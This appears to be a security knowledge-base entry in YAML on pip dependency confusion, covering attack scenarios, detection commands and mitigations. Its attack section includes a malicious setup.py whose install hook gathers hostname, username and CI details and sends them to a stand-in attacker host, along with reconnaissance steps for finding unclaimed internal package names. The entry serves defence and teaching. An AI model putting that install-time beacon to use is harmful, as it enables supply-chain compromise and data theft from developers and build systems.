---
name: "Dependency Confusion Attack"
packageManager: "pip"
slug: "pip-dependency-confusion"
category: "Dependency Confusion"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "Dependency confusion can arise when pip is configured to search both public PyPI and a private index. pip assigns no priority to those locations; it combines candidates and selects the best match for the requirement. An attacker who learns an internal distribution name can publish a public project with a version that the resolver prefers, subject to version constraints, compatibility, and other candidate-selection rules. Alex Birsan publicly demonstrated this attack pattern in 2021 against multiple companies."
descriptionCitations: [1, 2, 3, 4, 5, 6, 7]
prerequisites:
  - "Target organization uses internal/private Python packages with discoverable names"
  - "pip is configured with --extra-index-url pointing to a private registry (rather than --index-url which replaces PyPI)"
  - "Internal package names are not registered (reserved) on public PyPI"
  - "No version pinning with hash verification is in place"
prerequisitesCitations: [1, 2, 3, 4, 5, 6, 7]
attackScenarios:
  - title: "Exploiting --extra-index-url with higher version numbers"
    description: "When pip uses --extra-index-url, it checks both the primary and extra indexes without assigning either location priority. A public package with a higher compatible version can become the preferred candidate when it satisfies the complete requirement set; a high version alone does not override pins, compatibility rules, or hashes."
    citations: [1, 2, 3, 4, 5, 6, 7]
    commands:
      - label: "Reconnaissance: discover internal package names from leaked requirements or error messages"
        code: |
          # Internal package names can be discovered from:
          # - Public repositories accidentally containing requirements-internal.txt
          # - Error messages in CI/CD logs
          # - JavaScript source maps containing Python package references
          # - PyPI package metadata listing unpublished dependencies

          # Example: organization uses an internal package called "acme-auth"
          # Check if it exists on public PyPI
          pip index versions acme-auth 2>&1
          # "ERROR: No matching distribution found" means the name is available
        language: "bash"
      - label: "Attacker registers the package on PyPI with a high version number"
        code: |
          # setup.py for the malicious public package
          from setuptools import setup
          from setuptools.command.install import install
          import os
          import socket
          import json
          import urllib.request

          class ConfusionInstall(install):
              def run(self):
                  # Beacon to attacker to confirm successful confusion
                  info = {
                      "hostname": socket.gethostname(),
                      "package": "acme-auth",
                      "version": "99.0.0",
                      "user": os.environ.get("USER", os.environ.get("USERNAME", "")),
                      "ci": any(os.environ.get(v) for v in [
                          "CI", "GITHUB_ACTIONS", "JENKINS_URL", "GITLAB_CI"
                      ]),
                  }
                  try:
                      req = urllib.request.Request(
                          "https://attacker.example.com/confused",
                          data=json.dumps(info).encode(),
                          headers={"Content-Type": "application/json"},
                      )
                      urllib.request.urlopen(req, timeout=5)
                  except Exception:
                      pass
                  install.run(self)

          setup(
              name="acme-auth",
              version="99.0.0",  # Much higher than internal version
              description="Authentication utilities",
              cmdclass={"install": ConfusionInstall},
          )
        language: "python"
      - label: "Victim's pip.conf or pip install command that is vulnerable"
        code: |
          # Vulnerable pip.conf - uses --extra-index-url (searches BOTH indexes)
          # ~/.pip/pip.conf or %APPDATA%\pip\pip.ini
          [global]
          extra-index-url = https://pypi.internal.acme.com/simple/

          # When the victim runs:
          pip install acme-auth
          # pip finds version 1.2.3 on internal index and 99.0.0 on PyPI
          # pip installs 99.0.0 from PyPI (attacker's version)
        language: "bash"
  - title: "Exploiting requirements.txt without pinned versions"
    description: "Organizations that list internal dependencies in requirements.txt without pinning to exact versions or specifying the index URL are vulnerable. The default pip behavior checks PyPI first or alongside private indexes."
    citations: [1, 2, 3, 4, 5, 6, 7]
    commands:
      - label: "Vulnerable requirements.txt"
        code: |
          # requirements.txt
          # Public packages
          requests>=2.28.0
          flask>=2.0

          # Internal packages - vulnerable if not pinned with hashes
          acme-auth>=1.0
          acme-logging
          acme-metrics>=2.0
        language: "python"
      - label: "Safe requirements.txt with hash pinning"
        code: |
          # requirements.txt - secured against dependency confusion
          # Use --index-url (NOT --extra-index-url) to point exclusively to the private index.
          # Configure the private index to proxy/mirror public PyPI if public packages are also needed.
          --index-url https://pypi.internal.acme.com/simple/

          acme-auth==1.2.3 \
              --hash=sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
          acme-logging==3.1.0 \
              --hash=sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
        language: "python"
detection:
  - title: "Audit pip configuration for index URL settings"
    description: "Check all pip configuration files and environment variables for --extra-index-url usage, which searches multiple indexes and is the primary enabler of dependency confusion attacks. The safer alternative is --index-url which replaces PyPI entirely."
    citations: [1, 2, 3, 4, 5, 6, 7]
    commands:
      - code: |
          # Check pip configuration
          pip config list
          pip config debug

          # Search for extra-index-url in pip config files
          grep -rn "extra-index-url" ~/.pip/ ~/.config/pip/ /etc/pip.conf 2>/dev/null
          # Windows: check %APPDATA%\pip\pip.ini

          # Check environment variables
          echo $PIP_EXTRA_INDEX_URL
          echo $PIP_INDEX_URL
        language: "bash"
  - title: "Verify package source index during installation"
    description: "Use pip's verbose mode to confirm which index a package is being downloaded from, and check for unexpected public PyPI downloads of internal packages."
    citations: [1, 2, 3, 4, 5, 6, 7]
    commands:
      - code: |
          # Install with verbose output to see which index is used
          PACKAGE=acme-auth
          pip install -v "$PACKAGE" 2>&1 | grep -i "found\|downloading\|index"

          # Check installed package metadata for source
          pip show "$PACKAGE" | grep -i "location\|home-page"

          # List all packages and check for unexpected versions
          pip list --format=json | python3 -c "
          import json, sys
          for p in json.load(sys.stdin):
              if p['version'].startswith('99.') or p['version'].startswith('100.'):
                  print(f'SUSPICIOUS: {p[\"name\"]}=={p[\"version\"]}')
          "
        language: "bash"
mitigation:
  - "Use --index-url instead of --extra-index-url to point to the private registry exclusively, and configure the private registry to proxy/mirror public PyPI packages"
  - "Pin all dependencies to exact versions with --require-hashes to prevent version substitution"
  - "Use pip's --no-deps flag combined with a fully resolved lockfile to prevent transitive dependency confusion"
  - "Configure private package indexes to have priority over PyPI, or use tools like devpi that support index inheritance with priority control"
  - "Implement CI/CD controls that verify package provenance and source index before installation"
  - "Choose distinctive internal distribution names and verify they are not registered on public indexes; punctuation alone provides no separation because Python normalizes dots, hyphens, and underscores equivalently"
mitigationCitations: [1, 2, 3, 4, 5, 6, 7]
references:
  - title: "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies - Alex Birsan"
    url: "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
  - title: "Microsoft Learn - Azure Artifacts Upstream Sources"
    url: "https://learn.microsoft.com/en-us/azure/devops/artifacts/concepts/upstream-sources"
  - title: "pip documentation - Configuration"
    url: "https://pip.pypa.io/en/stable/topics/configuration/"
  - title: "PyPI - Namespace packages"
    url: "https://packaging.python.org/en/latest/guides/packaging-namespace-packages/"
  - title: "PEP 503 - Normalized Names"
    url: "https://peps.python.org/pep-0503/#normalized-names"
  - title: "pip install - Package Index Options"
    url: "https://pip.pypa.io/en/stable/cli/pip_install/#package-index-options"
  - title: "PEP 541 - Package Index Name Retention"
    url: "https://peps.python.org/pep-0541/"
created: 2026-04-02
updated: 2026-10-14
---
